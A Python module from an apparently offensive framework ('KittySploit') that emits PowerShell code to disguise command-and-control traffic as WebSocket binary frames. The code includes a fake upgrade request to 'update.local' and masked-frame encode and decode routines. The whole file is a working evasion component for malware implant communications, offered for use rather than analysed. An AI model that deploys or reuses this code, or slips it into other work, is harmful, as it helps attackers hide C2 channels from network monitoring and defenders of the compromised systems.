#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional
from modules.obfuscators.python.protocol.websocket_mimic import Module as PythonWebSocketObfuscator


class Module(PythonWebSocketObfuscator):
    """PowerShell WebSocket binary frame mimic obfuscator."""

    SUPPORTED_CLIENT_LANGUAGES = ["powershell"]

    __info__ = {
        "name": "PowerShell WebSocket Mimic Obfuscator",
        "description": "Wraps C2 bytes in WebSocket-like binary frames and emits PowerShell client code.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "powershell":
            return None
        return (
            "$script:obfBuf=New-Object System.Collections.Generic.List[byte];$script:obfFirst=$true;\n"
            "$script:obfUpgrade=[Text.Encoding]::ASCII.GetBytes(\"GET /socket.io/?transport=websocket HTTP/1.1`r`nHost: update.local`r`nUpgrade: websocket`r`nConnection: Upgrade`r`nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==`r`nSec-WebSocket-Version: 13`r`n`r`n\");\n"
            "function _obf_masked_frame([byte[]]$c){\n"
            " $out=New-Object System.Collections.Generic.List[byte];$out.Add(0x82)\n"
            " if($c.Length -lt 126){$out.Add(0x80 -bor $c.Length)}else{$out.Add(0x80 -bor 126);$out.Add(($c.Length -shr 8) -band 255);$out.Add($c.Length -band 255)}\n"
            " $m=New-Object byte[] 4;$rng=[Security.Cryptography.RandomNumberGenerator]::Create();$rng.GetBytes($m);$rng.Dispose();$out.AddRange($m)\n"
            " for($i=0;$i -lt $c.Length;$i++){$out.Add([byte]($c[$i] -bxor $m[$i%4]))}\n"
            " return $out.ToArray()\n"
            "}\n"
            "function _obf_encode([byte[]]$d){\n"
            " if($null -eq $d -or $d.Length -eq 0){return [byte[]]@()}\n"
            " $out=New-Object System.Collections.Generic.List[byte]\n"
            " if($script:obfFirst){$out.AddRange($script:obfUpgrade);$script:obfFirst=$false}\n"
            " $i=0;while($i -lt $d.Length){$n=[Math]::Min(65535,$d.Length-$i);$c=New-Object byte[] $n;[Array]::Copy($d,$i,$c,0,$n);$i+=$n;$out.AddRange((_obf_masked_frame $c))}\n"
            " return $out.ToArray()\n"
            "}\n"
            "function _obf_decode([byte[]]$d){\n"
            " if($null -ne $d -and $d.Length -gt 0){$script:obfBuf.AddRange($d)}\n"
            " $out=New-Object System.Collections.Generic.List[byte]\n"
            " while($script:obfBuf.Count -gt 0){\n"
            "  $txt=[Text.Encoding]::ASCII.GetString($script:obfBuf.ToArray())\n"
            "  if($txt.StartsWith('HTTP/') -or $txt.StartsWith('GET ') -or $txt.StartsWith('POST ')){$e=$txt.IndexOf(\"`r`n`r`n\");if($e -lt 0){break};$script:obfBuf.RemoveRange(0,$e+4);continue}\n"
            "  if($script:obfBuf.Count -lt 2){break}\n"
            "  $masked=($script:obfBuf[1] -band 0x80) -ne 0;$ln=$script:obfBuf[1] -band 0x7f;$pos=2\n"
            "  if($ln -eq 126){if($script:obfBuf.Count -lt 4){break};$ln=($script:obfBuf[2] -shl 8) -bor $script:obfBuf[3];$pos=4}elseif($ln -eq 127){$script:obfBuf.RemoveAt(0);continue}\n"
            "  if($ln -gt 65535){$script:obfBuf.RemoveAt(0);continue}\n"
            "  $mask=$null;if($masked){if($script:obfBuf.Count -lt $pos+4){break};$mask=$script:obfBuf.GetRange($pos,4).ToArray();$pos+=4}\n"
            "  $end=$pos+$ln;if($script:obfBuf.Count -lt $end){break}\n"
            "  $p=$script:obfBuf.GetRange($pos,$ln).ToArray();$script:obfBuf.RemoveRange(0,$end)\n"
            "  if($masked){for($i=0;$i -lt $p.Length;$i++){$p[$i]=[byte]($p[$i] -bxor $mask[$i%4])}}\n"
            "  $out.AddRange($p)\n"
            " }\n"
            " return $out.ToArray()\n"
            "}\n"
        )
